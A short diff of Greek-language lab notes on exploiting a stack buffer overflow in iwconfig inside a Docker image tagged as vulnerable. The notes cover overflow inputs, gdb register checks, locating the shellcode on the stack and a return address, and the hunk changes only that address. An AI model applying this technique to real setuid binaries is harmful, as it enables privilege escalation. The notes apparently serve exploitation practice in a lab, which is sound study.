@@ -37,7 +37,7 @@ run $(perl -e 'print "A"x100') ή run $(python3 -c 'print("A"*77)')
 στο gdb info registers -> eip=0x8040041 (πέρασε ένα Α)
 objdump -d /usr/sbin/iwconfig  (δεν βοήθησε πολύ)
 x/500x $esp για να βρω που είναι ο κώδικας shellcode (payload) 
--> 0xffffd77c -> 0xffffd770   '\x70\xd7\xff\xff' 
+-> 0xffffd76c -> 0xffffd770   '\x70\xd7\xff\xff' 
 
 ============================ΓΙΑ ΑΠΟΤΕΛΕΣΜΑ=================================
 docker run --rm --privileged -v `pwd`/exploit.py:/exploit.py -it ethan42/iwconfig:vulnerable /bin/bash
